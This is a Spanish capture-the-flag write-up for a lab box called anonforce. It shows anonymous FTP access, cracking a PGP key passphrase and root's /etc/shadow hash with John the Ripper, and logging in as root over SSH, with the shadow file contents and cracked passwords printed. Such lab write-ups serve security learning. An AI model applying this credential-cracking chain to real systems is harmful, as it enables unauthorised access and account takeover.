
# SCAN
Hay dos puertos abiertos:
1. 21: ftp con anonymous
2. 22: ssh

# FTP ANONYMOUS
Entramos y en el directorio /home nos deja leer el user.txt (muy facil)
Vamos al directorio raiz y vemos que hay un directorio sospechoso que se llama "notread" y dentro dos archivos:
1. backup.pgp: Es un archivo encriptado pgp (pretty good privacy)
2. private.asc: Es un archivo ascii armour (blindado) que contiene la clave privada

# Desencriptar el fichero backup.pgp
Para desencriptar el fichero necesitamos dos cosas:
1. Clave Privada
2. Passphrase

La clave privada la tenemos, nos hace falta el passphrase. Se puede obtener a partir de la clave privada y JtR. Primero tenemos que convertir la
clave privada en un hash con "pgp2john" y despues aplicar JtR
```
┌──(kali㉿kali)-[~/boxes/anonforce]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)     
1g 0:00:00:00 DONE (2022-07-17 12:47) 2.500g/s 2325p/s 2325c/s 2325C/s xbox360..sheena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Ahora podemos ya desencriptar el fichero con el programa gpg:
1. primero importamos la clave privada
```
┌──(kali㉿kali)-[~/boxes/anonforce]
└─$ gpg --import private.asc 
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

```
Nos pide introducir el passphrase que hemos obtenido en el anterior paso
2. Desencryptamos el archivo
```
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::
```
Como vemos el fichero contiene el archivo /etc/shadow
Con ftp anonymous podemos obtener el /etc/passwd
con los dos utilizando "unshadow" podemos obtener el hash y a traves de JtR el password de root
```
┌──(kali㉿kali)-[~/boxes/anonforce]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt us
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)     
1g 0:00:00:04 DONE (2022-07-17 12:59) 0.2212g/s 1529p/s 1529c/s 1529C/s 98765432..better
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
# SSH
Nos logeamos en ssh como root y de forma automatica obtenemos el root flag
